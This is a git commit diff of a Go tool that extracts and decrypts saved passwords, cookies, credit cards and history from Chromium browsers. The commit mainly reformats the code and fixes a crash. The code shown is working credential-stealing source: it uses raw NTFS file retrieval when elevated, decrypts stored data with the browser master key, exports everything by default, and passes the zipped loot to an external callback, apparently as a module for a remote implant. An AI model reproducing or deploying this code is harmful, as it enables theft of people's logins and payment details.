70950f67e9fb813113d66398ba965bb3a6c7ea7d
lz520520 <610188221@qq.com>
2024-06-28 19:32:46 +0800

    update crash bug

--- browser/chromium/chromium.go
+++ browser/chromium/chromium.go
@@ -1,168 +1,172 @@
 package chromium
 
 import (
-	"io/fs"
-	"log/slog"
-	"path/filepath"
-	"strings"
+    "fmt"
+    "io/fs"
+    "log/slog"
+    "path/filepath"
+    "strings"
 
-	"tests/browsingdata"
-	"tests/item"
-	"tests/utils/fileutil"
-	"tests/utils/typeutil"
+    "tests/browsingdata"
+    "tests/item"
+    "tests/utils/fileutil"
+    "tests/utils/typeutil"
 )
 
 type Chromium struct {
-	name        string
-	storage     string
-	profilePath string
-	masterKey   []byte
-	items       []item.Item
-	itemPaths   map[item.Item]string
+    name        string
+    storage     string
+    profilePath string
+    masterKey   []byte
+    items       []item.Item
+    itemPaths   map[item.Item]string
 }
 
 // New create instance of Chromium browser, fill item's path if item is existed.
 func New(name, storage, profilePath string, items []item.Item) ([]*Chromium, error) {
-	c := &Chromium{
-		name:        name,
-		storage:     storage,
-		profilePath: profilePath,
-		items:       items,
-	}
-	multiItemPaths, err := c.userItemPaths(c.profilePath, c.items)
-	if err != nil {
-		return nil, err
-	}
-	chromiumList := make([]*Chromium, 0, len(multiItemPaths))
-	for user, itemPaths := range multiItemPaths {
-		chromiumList = append(chromiumList, &Chromium{
-			name:      fileutil.BrowserName(name, user),
-			items:     typeutil.Keys(itemPaths),
-			itemPaths: itemPaths,
-			storage:   storage,
-		})
-	}
-	return chromiumList, nil
+    c := &Chromium{
+        name:        name,
+        storage:     storage,
+        profilePath: profilePath,
+        items:       items,
+    }
+    multiItemPaths, err := c.userItemPaths(c.profilePath, c.items)
+    if err != nil {
+        return nil, err
+    }
+    chromiumList := make([]*Chromium, 0, len(multiItemPaths))
+    for user, itemPaths := range multiItemPaths {
+        chromiumList = append(chromiumList, &Chromium{
+            name:      fileutil.BrowserName(name, user),
+            items:     typeutil.Keys(itemPaths),
+            itemPaths: itemPaths,
+            storage:   storage,
+        })
+    }
+    return chromiumList, nil
 }
 
 func (c *Chromium) Name() string {
-	return c.name
+    return c.name
 }
 
 func (c *Chromium) BrowsingData(isFullExport bool) (*browsingdata.Data, error) {
-	items := c.items
-	if !isFullExport {
-		items = item.FilterSensitiveItems(c.items)
-	}
+    items := c.items
+    if !isFullExport {
+        items = item.FilterSensitiveItems(c.items)
+    }
 
-	data := browsingdata.New(items)
+    data := browsingdata.New(items)
 
-	if err := c.copyItemToLocal(); err != nil {
-		return nil, err
-	}
+    if err := c.copyItemToLocal(); err != nil {
+        return nil, err
+    }
 
-	masterKey, err := c.GetMasterKey()
-	if err != nil {
-		return nil, err
-	}
+    masterKey, err := c.GetMasterKey()
+    if err != nil {
+        return nil, err
+    }
 
-	c.masterKey = masterKey
-	if err := data.Recovery(c.masterKey); err != nil {
-		return nil, err
-	}
+    c.masterKey = masterKey
+    if err := data.Recovery(c.masterKey); err != nil {
+        return nil, err
+    }
 
-	return data, nil
+    return data, nil
 }
 
 func (c *Chromium) copyItemToLocal() error {
-	for i, path := range c.itemPaths {
-		filename := i.TempFilename()
-		var err error
-		switch {
-		case fileutil.IsDirExists(path):
-			if i == item.ChromiumLocalStorage {
-				err = fileutil.CopyDir(path, filename, "lock")
-			}
-			if i == item.ChromiumSessionStorage {
-				err = fileutil.CopyDir(path, filename, "lock")
-			}
-		default:
-			if fileutil.CheckIfElevated() {
-				npath := fileutil.EnsureNTFSPath(path)
-				npathRela := strings.Join(npath[1:], "//")
-				err = fileutil.TryRetrieveFile(npath[0], npathRela, filename)
-			} else {
-				err = fileutil.CopyFile(path, filename)
+    for i, path := range c.itemPaths {
+        filename := i.TempFilename()
+        var err error
+        switch {
+        case fileutil.IsDirExists(path):
+            if i == item.ChromiumLocalStorage {
+                err = fileutil.CopyDir(path, filename, "lock")
+            }
+            if i == item.ChromiumSessionStorage {
+                err = fileutil.CopyDir(path, filename, "lock")
+            }
+        default:
+            if fileutil.CheckIfElevated() {
+                npath := fileutil.EnsureNTFSPath(path)
+                npathRela := strings.Join(npath[1:], "//")
+                err = fileutil.TryRetrieveFile(npath[0], npathRela, filename)
+            } else {
+                err = fileutil.CopyFile(path, filename)
 
-			}
-		}
-		if err != nil {
-			slog.Error("copy item to local error", "path", path, "filename", filename, "err", err)
-			continue
-		}
-	}
-	return nil
+            }
+        }
+        if err != nil {
+            slog.Error("copy item to local error", "path", path, "filename", filename, "err", err)
+            continue
+        }
+    }
+    return nil
 }
 
 // userItemPaths return a map of user to item path, map[profile 1][item's name & path key pair]
 func (c *Chromium) userItemPaths(profilePath string, items []item.Item) (map[string]map[item.Item]string, error) {
-	multiItemPaths := make(map[string]map[item.Item]string)
-	parentDir := fileutil.ParentDir(profilePath)
-	err := filepath.Walk(parentDir, chromiumWalkFunc(items, multiItemPaths))
-	if err != nil {
-		return nil, err
-	}
-	var keyPath string
-	var dir string
-	for userDir, v := range multiItemPaths {
-		for _, p := range v {
-			if strings.HasSuffix(p, item.ChromiumKey.Filename()) {
-				keyPath = p
-				dir = userDir
-				break
-			}
-		}
-	}
-	t := make(map[string]map[item.Item]string)
-	for userDir, v := range multiItemPaths {
-		if userDir == dir {
-			continue
-		}
-		t[userDir] = v
-		t[userDir][item.ChromiumKey] = keyPath
-		fillLocalStoragePath(t[userDir], item.ChromiumLocalStorage)
-	}
-	return t, nil
+    multiItemPaths := make(map[string]map[item.Item]string)
+    parentDir := fileutil.ParentDir(profilePath)
+    err := filepath.Walk(parentDir, chromiumWalkFunc(items, multiItemPaths))
+    if err != nil {
+        return nil, err
+    }
+    var keyPath string
+    var dir string
+    for userDir, v := range multiItemPaths {
+        for _, p := range v {
+            if strings.HasSuffix(p, item.ChromiumKey.Filename()) {
+                keyPath = p
+                dir = userDir
+                break
+            }
+        }
+    }
+    t := make(map[string]map[item.Item]string)
+    for userDir, v := range multiItemPaths {
+        if userDir == dir {
+            continue
+        }
+        t[userDir] = v
+        t[userDir][item.ChromiumKey] = keyPath
+        fillLocalStoragePath(t[userDir], item.ChromiumLocalStorage)
+    }
+    return t, nil
 }
 
 // chromiumWalkFunc return a filepath.WalkFunc to find item's path
 func chromiumWalkFunc(items []item.Item, multiItemPaths map[string]map[item.Item]string) filepath.WalkFunc {
-	return func(path string, info fs.FileInfo, err error) error {
-		for _, v := range items {
-			if info.Name() == v.Filename() {
-				if strings.Contains(path, "System Profile") {
-					continue
-				}
-				profileFolder := fileutil.ParentBaseDir(path)
-				if strings.Contains(filepath.ToSlash(path), "/Network/Cookies") {
-					profileFolder = fileutil.BaseDir(strings.ReplaceAll(filepath.ToSlash(path), "/Network/Cookies", ""))
-				}
-				if _, exist := multiItemPaths[profileFolder]; exist {
-					multiItemPaths[profileFolder][v] = path
-				} else {
-					multiItemPaths[profileFolder] = map[item.Item]string{v: path}
-				}
-			}
-		}
-		return err
-	}
+    return func(path string, info fs.FileInfo, err error) error {
+        if info == nil || items == nil {
+            return fmt.Errorf("info is nil")
+        }
+        for _, v := range items {
+            if info.Name() == v.Filename() {
+                if strings.Contains(path, "System Profile") {
+                    continue
+                }
+                profileFolder := fileutil.ParentBaseDir(path)
+                if strings.Contains(filepath.ToSlash(path), "/Network/Cookies") {
+                    profileFolder = fileutil.BaseDir(strings.ReplaceAll(filepath.ToSlash(path), "/Network/Cookies", ""))
+                }
+                if _, exist := multiItemPaths[profileFolder]; exist {
+                    multiItemPaths[profileFolder][v] = path
+                } else {
+                    multiItemPaths[profileFolder] = map[item.Item]string{v: path}
+                }
+            }
+        }
+        return err
+    }
 }
 
 func fillLocalStoragePath(itemPaths map[item.Item]string, storage item.Item) {
-	if p, ok := itemPaths[item.ChromiumHistory]; ok {
-		lsp := filepath.Join(filepath.Dir(p), storage.Filename())
-		if fileutil.IsDirExists(lsp) {
-			itemPaths[item.ChromiumLocalStorage] = lsp
-		}
-	}
+    if p, ok := itemPaths[item.ChromiumHistory]; ok {
+        lsp := filepath.Join(filepath.Dir(p), storage.Filename())
+        if fileutil.IsDirExists(lsp) {
+            itemPaths[item.ChromiumLocalStorage] = lsp
+        }
+    }
 }
--- cmd/run/run.go
+++ cmd/run/run.go
@@ -1,100 +1,121 @@
 package run
 
 import (
-	"archive/zip"
-	"bytes"
-	"github.com/urfave/cli/v2"
-	"log/slog"
-	"os"
-	"tests/browser"
-	"tests/logger"
-	"tests/utils/fileutil"
+    "archive/zip"
+    "bytes"
+    "github.com/urfave/cli/v2"
+    "log/slog"
+    "os"
+    "tests/browser"
+    "tests/logger"
+    "tests/utils/fileutil"
 )
 
 var (
-	browserName  string
-	outputDir    string
-	outputFormat string
-	verbose      bool
-	compress     bool
-	profilePath  string
-	isFullExport bool
+    browserName  string
+    outputDir    string
+    outputFormat string
+    verbose      bool
+    compress     bool
+    profilePath  string
+    isFullExport bool
 
-	LogCallback func(logType int, msg []byte, size int)
+    LogCallback func(logType int, msg []byte, size int)
 )
 
+func LogSuccess(msg string) {
+    if LogCallback != nil {
+        LogCallback(1, []byte(msg), 0)
+    }
+}
+func LogInfo(msg string) {
+    if LogCallback != nil {
+        LogCallback(0, []byte(msg), 0)
+    }
+}
+func LogErr(msg string) {
+    if LogCallback != nil {
+        LogCallback(2, []byte(msg), 0)
+    }
+}
+func LogBytes(msg []byte, size int) {
+    if LogCallback != nil {
+        LogCallback(0xf, msg, size)
+    }
+}
+
 func Execute() {
-	app := &cli.App{
-		Name:      "tools",
-		Usage:     "Export passwords|bookmarks|cookies|history|credit cards|download history|localStorage|extensions from browser",
-		UsageText: "[tools -b chrome -f json -dir results --zip]\nExport all browsing data (passwords/cookies/history/bookmarks) from browser",
-		Version:   "0.4.5",
-		Flags: []cli.Flag{
-			&cli.BoolFlag{Name: "verbose", Aliases: []string{"vv"}, Destination: &verbose, Value: false, Usage: "verbose"},
-			&cli.BoolFlag{Name: "compress", Aliases: []string{"zip"}, Destination: &compress, Value: false, Usage: "compress result to zip"},
-			&cli.StringFlag{Name: "browser", Aliases: []string{"b"}, Destination: &browserName, Value: "all", Usage: "available browsers: all|" + browser.Names()},
-			&cli.StringFlag{Name: "results-dir", Aliases: []string{"dir"}, Destination: &outputDir, Value: "results", Usage: "export dir"},
-			&cli.StringFlag{Name: "format", Aliases: []string{"f"}, Destination: &outputFormat, Value: "json", Usage: "output format: csv|json"},
-			&cli.StringFlag{Name: "profile-path", Aliases: []string{"p"}, Destination: &profilePath, Value: "", Usage: "custom profile dir path, get with chrome://version"},
-			&cli.BoolFlag{Name: "full-export", Aliases: []string{"full"}, Destination: &isFullExport, Value: true, Usage: "is export full browsing data"},
-		},
-		HideHelpCommand: true,
-		Action: func(c *cli.Context) error {
-			if verbose {
-				logger.Default.SetVerbose()
-				logger.Configure(logger.Default)
-			}
-			browsers, err := browser.PickBrowsers(browserName, profilePath)
-			if err != nil {
-				slog.Error("pick browsers error", "err", err)
-			}
-			outBuffer := bytes.Buffer{}
-			zw := zip.NewWriter(&outBuffer)
-			for _, b := range browsers {
-				data, err := b.BrowsingData(isFullExport)
-				if err != nil {
-					slog.Error("get browsing data error", "err", err)
-					continue
-				}
-				data.Output(zw, outputDir, b.Name(), outputFormat)
-			}
-			zw.Close()
+    app := &cli.App{
+        Name:      "tools",
+        Usage:     "Export passwords|bookmarks|cookies|history|credit cards|download history|localStorage|extensions from browser",
+        UsageText: "[tools -b chrome -f json -dir results --zip]\nExport all browsing data (passwords/cookies/history/bookmarks) from browser",
+        Version:   "0.4.5",
+        Flags: []cli.Flag{
+            &cli.BoolFlag{Name: "verbose", Aliases: []string{"vv"}, Destination: &verbose, Value: false, Usage: "verbose"},
+            &cli.BoolFlag{Name: "compress", Aliases: []string{"zip"}, Destination: &compress, Value: false, Usage: "compress result to zip"},
+            &cli.StringFlag{Name: "browser", Aliases: []string{"b"}, Destination: &browserName, Value: "all", Usage: "available browsers: all|" + browser.Names()},
+            &cli.StringFlag{Name: "results-dir", Aliases: []string{"dir"}, Destination: &outputDir, Value: "results", Usage: "export dir"},
+            &cli.StringFlag{Name: "format", Aliases: []string{"f"}, Destination: &outputFormat, Value: "json", Usage: "output format: csv|json"},
+            &cli.StringFlag{Name: "profile-path", Aliases: []string{"p"}, Destination: &profilePath, Value: "", Usage: "custom profile dir path, get with chrome://version"},
+            &cli.BoolFlag{Name: "full-export", Aliases: []string{"full"}, Destination: &isFullExport, Value: true, Usage: "is export full browsing data"},
+        },
+        HideHelpCommand: true,
+        Action: func(c *cli.Context) error {
+            if verbose {
+                logger.Default.SetVerbose()
+                logger.Configure(logger.Default)
+            }
+            browsers, err := browser.PickBrowsers(browserName, profilePath)
+            if err != nil {
+                slog.Error("pick browsers error", "err", err)
+            }
+            outBuffer := bytes.Buffer{}
+            zw := zip.NewWriter(&outBuffer)
+            for _, b := range browsers {
+                data, err := b.BrowsingData(isFullExport)
+                if err != nil {
+                    slog.Error("get browsing data error", "err", err)
+                    continue
+                }
+                data.Output(zw, outputDir, b.Name(), outputFormat)
+            }
+            zw.Close()
 
-			//host, _ := os.Hostname()
-			//out := crypto.AESEncrypt(outBuffer.Bytes(), []byte(host))
-			//outName := uuid.New().String()
-			if LogCallback != nil {
-				LogCallback(1, []byte("recv browser data start"), 0)
-				b := outBuffer.Bytes()
+            //host, _ := os.Hostname()
+            //out := crypto.AESEncrypt(outBuffer.Bytes(), []byte(host))
+            //outName := uuid.New().String()
+            if LogCallback != nil {
+                LogCallback(1, []byte("recv browser data start"), 0)
+                b := outBuffer.Bytes()
 
-				LogCallback(0xf, b, len(b))
-				LogCallback(1, []byte("recv browser data success"), 0)
-			}
+                LogCallback(0xf, b, len(b))
+                LogCallback(1, []byte("recv browser data success"), 0)
+            }
 
-			//if err = os.WriteFile(outName, out, 666); err != nil {
-			//    slog.Error("write zip error: ", "err", err)
-			//} else {
-			//    if tmp, err := filepath.Abs(outName); err == nil {
-			//        outName = tmp
-			//    }
-			//    msg := "save success,out: " + outName
-			//    if LogCallback != nil {
-			//        LogCallback(1, "save success,out: "+outName, 0)
-			//    }
-			//    slog.Warn(msg)
-			//}
+            //if err = os.WriteFile(outName, out, 666); err != nil {
+            //    slog.Error("write zip error: ", "err", err)
+            //} else {
+            //    if tmp, err := filepath.Abs(outName); err == nil {
+            //        outName = tmp
+            //    }
+            //    msg := "save success,out: " + outName
+            //    if LogCallback != nil {
+            //        LogCallback(1, "save success,out: "+outName, 0)
+            //    }
+            //    slog.Warn(msg)
+            //}
 
-			if compress {
-				if err = fileutil.CompressDir(outputDir); err != nil {
-					slog.Error("compress error: ", "err", err)
-				}
-				slog.Info("compress success")
-			}
-			return nil
-		},
-	}
-	err := app.Run(os.Args)
-	if err != nil {
-		panic(err)
-	}
+            if compress {
+                if err = fileutil.CompressDir(outputDir); err != nil {
+                    slog.Error("compress error: ", "err", err)
+                }
+                slog.Info("compress success")
+            }
+            return nil
+        },
+    }
+    err := app.Run(os.Args)
+    if err != nil {
+        panic(err)
+    }
 }
